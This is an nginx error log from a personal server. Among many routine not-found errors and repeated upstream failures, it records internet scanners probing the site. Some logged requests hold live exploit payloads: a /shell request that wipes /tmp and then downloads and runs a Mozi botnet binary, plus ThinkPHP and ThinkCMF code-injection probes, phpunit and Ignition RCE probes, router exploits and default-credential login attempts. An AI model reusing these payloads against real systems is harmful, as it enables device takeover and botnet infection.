2022/01/08 03:28:23 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:28:29 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:28:35 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:28:42 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:28:48 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:28:55 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:05 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:27 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:33 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:39 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:45 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:51 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:29:59 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:30:08 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:31:45 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:31:51 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:31:57 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:35:07 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:35:13 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 03:35:19 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:24:43 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:24:49 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:24:55 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:25:02 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:25:08 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:25:48 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:25:54 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:26:00 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:26:07 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:26:14 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:26:21 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:26:30 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:26:42 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:27:01 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:27:32 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:28:29 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 04:29:35 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 06:12:13 [error] 7#7: *5 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 64.62.197.62, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/08 06:53:17 [error] 7#7: *6 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 82.151.123.60, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
2022/01/08 08:03:44 [error] 7#7: *7 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 157.230.104.160, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/08 08:06:06 [error] 7#7: *8 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/08 08:06:06 [error] 7#7: *9 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/08 08:49:00 [error] 7#7: *10 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 182.127.164.49, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=adminisp&psd=adminisp HTTP/1.0"
2022/01/08 09:17:55 [error] 7#7: *12 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.195, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/08 09:17:55 [error] 7#7: *13 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 162.142.125.195, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/08 09:33:29 [error] 7#7: *14 open() "/etc/nginx/html/boaform/admin/formLogin" failed (2: No such file or directory), client: 175.107.0.62, server: 0.0.0.0, request: "GET /boaform/admin/formLogin?username=ec8&psd=ec8 HTTP/1.0"
2022/01/08 09:33:30 [error] 7#7: *15 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 128.14.141.34, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/08 10:22:51 [error] 7#7: *17 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 92.118.161.49, server: 0.0.0.0, request: "GET / HTTP/1.0"
2022/01/08 11:36:07 [error] 7#7: *22 open() "/etc/nginx/html/shell" failed (2: No such file or directory), client: 120.85.112.4, server: 0.0.0.0, request: "GET /shell?cd+/tmp;rm+-rf+*;wget+http://192.168.1.1:8088/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws HTTP/1.1", host: "44.195.238.80:80"
2022/01/08 11:49:17 [error] 7#7: *23 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/08 11:49:17 [error] 7#7: *24 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/08 12:26:49 [error] 7#7: *25 open() "/etc/nginx/html/GponForm/diag_Form" failed (2: No such file or directory), client: 120.85.113.82, server: 0.0.0.0, request: "POST /GponForm/diag_Form?images/ HTTP/1.1", host: "127.0.0.1:80"
2022/01/08 12:29:27 [error] 7#7: *28 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/08 12:29:48 [error] 7#7: *29 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80"
2022/01/08 12:29:48 [error] 7#7: *30 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET /robots.txt HTTP/1.1", host: "44.195.238.80"
2022/01/08 12:29:49 [error] 7#7: *31 open() "/etc/nginx/html/sitemap.xml" failed (2: No such file or directory), client: 180.215.130.17, server: 0.0.0.0, request: "GET /sitemap.xml HTTP/1.1", host: "44.195.238.80"
2022/01/08 12:58:35 [error] 7#7: *32 open() "/etc/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.53.74, server: 0.0.0.0, request: "GET /config/getuser?index=0 HTTP/1.1", host: "44.195.238.80:80"
2022/01/08 13:07:56 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/xmlrpc.php" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /xmlrpc.php?rsd HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/blog/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /blog/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/web/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /web/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wordpress/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wordpress/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/website/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /website/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/news/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /news/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/2020/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /2020/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/2019/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /2019/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/shop/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /shop/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp1/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp1/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/test/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /test/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/wp2/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /wp2/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/site/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /site/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/cms/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /cms/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 13:07:56 [error] 7#7: *33 open() "/etc/nginx/html/sito/wp-includes/wlwmanifest.xml" failed (2: No such file or directory), client: 20.102.57.191, server: 0.0.0.0, request: "GET /sito/wp-includes/wlwmanifest.xml HTTP/1.1", host: "leobalbino.com"
2022/01/08 14:22:27 [error] 7#7: *34 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/08 14:22:28 [error] 7#7: *35 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/08 14:53:51 [error] 7#7: *37 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 194.44.57.232, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/08 14:58:40 [error] 7#7: *38 open() "/etc/nginx/html/config/getuser" failed (2: No such file or directory), client: 209.141.53.74, server: 0.0.0.0, request: "GET /config/getuser?index=0 HTTP/1.1", host: "44.195.238.80:80"
2022/01/08 15:24:16 [error] 7#7: *39 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 143.244.154.242, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/08 15:24:16 [error] 7#7: *40 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 143.244.154.242, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/08 17:08:29 [error] 7#7: *41 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 195.144.235.42, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/08 18:10:05 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:11 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:17 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:23 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:30 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:37 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:46 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:10:58 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:11:17 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:11:48 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/08 18:12:45 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/12 05:11:28 [error] 7#7: *3 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 05:17:14 [error] 7#7: *4 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/12 05:17:15 [error] 7#7: *4 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80", referrer: "http://44.195.238.80/"
2022/01/12 05:17:25 [error] 7#7: *4 open() "/etc/nginx/html/users" failed (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET /users HTTP/1.1", host: "44.195.238.80"
2022/01/12 05:17:28 [error] 7#7: *4 "/etc/nginx/html/users/index.html" is not found (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET /users/ HTTP/1.1", host: "44.195.238.80"
2022/01/12 06:05:35 [error] 7#7: *3 open() "/etc/nginx/html/fuN3" failed (2: No such file or directory), client: 172.104.138.223, server: 0.0.0.0, request: "GET /fuN3 HTTP/1.0"
2022/01/12 06:30:35 [error] 7#7: *4 open() "/etc/nginx/html/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php" failed (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 06:51:23 [error] 7#7: *5 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 54.206.65.48, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/12 07:19:33 [error] 7#7: *7 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 42.83.147.34, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/12 07:21:47 [error] 7#7: *8 open() "/etc/nginx/html/solr/admin/info/system" failed (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "GET /solr/admin/info/system?wt=json HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 07:58:08 [error] 7#7: *9 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 152.136.11.152, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "www.leobalbino.com"
2022/01/12 08:13:38 [error] 7#7: *10 open() "/etc/nginx/html/index.php" failed (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 08:18:49 [error] 7#7: *11 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 08:18:50 [error] 7#7: *12 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 08:27:55 [error] 7#7: *13 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 09:05:37 [error] 7#7: *14 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 09:58:36 [error] 7#7: *15 open() "/etc/nginx/html/Autodiscover/Autodiscover.xml" failed (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "POST /Autodiscover/Autodiscover.xml HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 10:37:39 [error] 7#7: *16 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 136.144.41.117, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 10:46:18 [error] 7#7: *17 open() "/etc/nginx/html/_ignition/execute-solution" failed (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "GET /_ignition/execute-solution HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 10:51:35 [error] 7#7: *18 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.146.165.37, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 11:10:12 [error] 7#7: *19 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 66.249.69.72, server: 0.0.0.0, request: "GET /robots.txt HTTP/1.1", host: "leobalbino.com"
2022/01/12 11:10:12 [error] 7#7: *20 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 66.249.69.74, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/12 11:30:17 [error] 7#7: *21 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 123.60.83.110, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "www.leobalbino.com"
2022/01/12 11:39:18 [error] 7#7: *22 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 35.167.86.156, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/12 11:41:46 [error] 7#7: *23 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 11:41:47 [error] 7#7: *24 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 12:01:03 [error] 7#7: *25 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.129.18.102, server: 0.0.0.0, request: "HEAD / HTTP/1.1", host: "leobalbino.com"
2022/01/12 12:14:23 [error] 7#7: *26 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 136.144.41.6, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80", referrer: "http://44.195.238.80:80/left.html"
2022/01/12 12:25:18 [error] 7#7: *27 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 66.240.236.109, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/12 14:50:21 [error] 7#7: *30 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 170.106.176.49, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 14:50:28 [error] 7#7: *31 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.141.33.65, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/12 14:50:29 [error] 7#7: *31 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 209.141.33.65, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80"
2022/01/12 14:50:31 [error] 7#7: *32 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 14:50:32 [error] 7#7: *33 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 14:53:12 [error] 7#7: *34 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 14:53:12 [error] 7#7: *35 "/etc/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "POST /HNAP1/ HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 15:00:47 [error] 7#7: *36 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 183.136.226.3, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 15:14:45 [error] 7#7: *37 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 45.129.18.150, server: 0.0.0.0, request: "HEAD / HTTP/1.1", host: "backend.leobalbino.com"
2022/01/12 16:30:54 [error] 7#7: *41 open() "/etc/nginx/html/robots.txt" failed (2: No such file or directory), client: 207.46.13.231, server: 0.0.0.0, request: "GET /robots.txt HTTP/1.1", host: "www.leobalbino.com"
2022/01/12 16:30:57 [error] 7#7: *42 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 207.46.13.179, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "www.leobalbino.com"
2022/01/12 17:08:25 [error] 7#7: *43 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 17:08:28 [error] 7#7: *44 "/etc/nginx/html/HNAP1/index.html" is not found (2: No such file or directory), client: 107.189.12.178, server: 0.0.0.0, request: "POST /HNAP1/ HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 17:11:56 [error] 7#7: *45 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 17:11:57 [error] 7#7: *46 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 17:36:30 [error] 7#7: *47 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 44.194.92.19, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "leobalbino.com"
2022/01/12 19:07:56 [error] 7#7: *48 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 83.0.37.30, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
2022/01/12 19:13:23 [error] 7#7: *49 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 109.237.103.9, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 20:07:59 [error] 7#7: *50 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 20:07:59 [error] 7#7: *51 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.217, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 20:15:53 [error] 7#7: *52 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 92.118.161.33, server: 0.0.0.0, request: "GET / HTTP/1.0"
2022/01/12 21:08:09 [error] 7#7: *54 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.102.81.95, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 21:08:09 [error] 7#7: *55 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 20.102.81.95, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 21:08:09 [error] 7#7: *56 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 20.102.81.95, server: 0.0.0.0, request: "POST /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 21:37:25 [error] 7#7: *57 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.17.96.162, server: 0.0.0.0, request: "GET / HTTP/1.0"
2022/01/12 22:59:02 [error] 7#7: *59 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 81.153.43.220, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80"
2022/01/12 23:22:18 [error] 7#7: *60 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/12 23:22:20 [error] 7#7: *61 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 185.254.196.218, server: 0.0.0.0, request: "POST / HTTP/1.1", host: "44.195.238.80"
2022/01/12 23:48:08 [error] 7#7: *62 open() "/etc/nginx/html/.env" failed (2: No such file or directory), client: 109.237.103.123, server: 0.0.0.0, request: "GET /.env HTTP/1.1", host: "44.195.238.80"
2022/01/13 01:31:16 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/13 01:31:23 [emerg] 1#1: host not found in upstream "api" in /etc/nginx/conf.d/local.conf:5
2022/01/13 01:36:41 [error] 7#7: *1 open() "/etc/nginx/html/users" failed (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET /users HTTP/1.1", host: "44.195.238.80"
2022/01/13 01:36:42 [error] 7#7: *1 open() "/etc/nginx/html/favicon.ico" failed (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET /favicon.ico HTTP/1.1", host: "44.195.238.80", referrer: "http://44.195.238.80/users"
2022/01/13 01:36:47 [error] 7#7: *1 open() "/etc/nginx/html/users" failed (2: No such file or directory), client: 187.22.128.199, server: 0.0.0.0, request: "GET /users HTTP/1.1", host: "44.195.238.80"
2022/01/13 02:38:00 [error] 7#7: *4 "/etc/nginx/html/index.html" is not found (2: No such file or directory), client: 209.17.96.34, server: 0.0.0.0, request: "GET / HTTP/1.1", host: "44.195.238.80:80"
